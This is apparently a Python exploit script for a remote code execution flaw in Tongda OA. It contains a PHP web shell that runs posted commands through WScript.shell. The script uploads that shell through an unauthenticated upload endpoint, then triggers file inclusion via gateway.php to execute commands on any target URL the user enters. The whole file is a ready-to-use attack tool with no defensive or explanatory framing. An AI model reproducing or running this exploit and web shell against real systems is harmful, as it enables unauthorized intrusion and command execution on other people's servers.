# 参考：https://github.com/jas502n/OA-tongda-RCE

import os
import requests
from loguru import logger

if not os.path.exists('log'):
    os.mkdir('log')
logger.add('/log/{time}.log', rotation='10 MB')



vul_url = ''  # 漏洞url


def upload_file():
    """
    上传文件至/ispirit/im/upload.php
    :return:上传成功返回需包含的路径
    """
    if not os.path.exists('biu.txt'):
        f = open('biu.txt', 'w')
        f.write('''<?php
    $command=$_POST['cmd'];
    $wsh = new COM('WScript.shell');
    $exec = $wsh->exec("cmd /c ".$command);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
    ?>''')
        f.close()
    upload_url = "{}/ispirit/im/upload.php".format(vul_url)
    logger.info('上传路径为：{}'.format(upload_url))
    try:
        files = {'ATTACHMENT': open('biu.txt', 'r')}
        upload_data = {"P": "123", "DEST_UID": "1", "UPLOAD_MODE": "2"}
        upload_res = requests.post(url=upload_url, data=upload_data, files=files )
    except Exception as e:
        logger.error('上传文件，网络连接失败！错误原因：'.format(e))
        return False
    out = upload_res.text
    if '+OK' in out:
        path = out[out.find('@'):out.rfind('|')].replace('@', '/').replace('_', '/').replace('|', '.')
        logger.success('文件上传成功！详情：{}'.format(out))
        return '/general/../../attach/im/{}'.format(path)
    else:
        logger.error('文件上传失败，返回值为：{}'.format(out))


def include_file(cmd='whoami'):
    logger.info('执行CMD命令：{}'.format(cmd))
    include_url1 = "{}/interface/gateway.php".format(vul_url)
    include_url2 = "{}/mac/gateway.php".format(vul_url)
    path = upload_file()
    if path:
        include_data = {'json': '{"url":"%s"}' % path, 'cmd': cmd}
        r1 = requests.post(url=include_url1, data=include_data)
        logger.info('/interface/gateway.php 文件包含返回包：{}'.format(r1.text))
        # print(r1.text)
        if r1.status_code == 404:
            r2 = requests.post(url=include_url2, data=include_data)
            logger.info('/mac/gateway.php 文件包含返回包：{}'.format(r2.text))
            # print(r2.text)
        else:
            logger.error('文件包含失败！')


def exp():
    logger.info('待测url为：{}'.format(vul_url))
    include_file()


if __name__ == '__main__':
    while True:
        vul_url = input('输入检测url(e.g: http://1.1.1.1)，按q退出：')
        if not vul_url == 'q':
            exp()
        else:
            break
